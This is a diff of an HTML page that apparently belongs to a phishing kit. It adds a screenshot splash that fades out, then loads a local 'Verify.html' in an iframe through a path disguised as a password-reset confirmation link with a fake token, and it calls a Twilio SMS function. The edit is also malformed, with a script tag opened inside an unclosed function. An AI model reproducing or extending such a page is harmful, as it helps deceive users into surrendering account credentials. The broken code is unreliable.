@@ -94,8 +94,34 @@
          sendTwilioSMS();
       });
    </script>
- 
+</head>
+<body>
+   <div class="container" id="container">
+      <img class="image" src="Screenshot-2023-0925-025553-x4.png" alt="Image 1">
+   </div>
+
    <script>
+      // Simulate the opening animation
+      setTimeout(function () {
+         document.getElementById('container').style.opacity = '0';
+         setTimeout(function () {
+            document.getElementById('container').style.display = 'none';
+            // Load the iframe after the animation
+            loadIframe();
+         }, 100); // Adjust the delay as needed
+      }, 1600); // Adjust the initial delay as needed
+   </script>
+
+   <!-- Add the iframe-related code here -->
+   <script>
+      function loadIframe() {
+         const iframe = document.createElement('iframe');
+
+         // Set iframe attributes
+         iframe.src = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html'; // Change the URL to your desired destination
+         iframe.id = 'myiframe';
+
+       <script>
     window.addEventListener('message', function (event) {
         if (event.data === 'closeAllWindows') {
             console.log('Received closeAllWindows message');
@@ -171,14 +197,7 @@ window.addEventListener('message', function (event) {
 
    <!-- Add the iframe-related code here -->
    <script>
-      function loadIframe() {
-         const iframe = document.createElement('iframe');
-
-         // Set iframe attributes
-         iframe.src = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html'; // Change the URL to your desired destination
-         iframe.id = 'myiframe';
-
-         // Log to console indicating that we are inside an iframe
+  // Log to console indicating that we are inside an iframe
          console.log('Inside iframe');
 
          // Append iframe to body
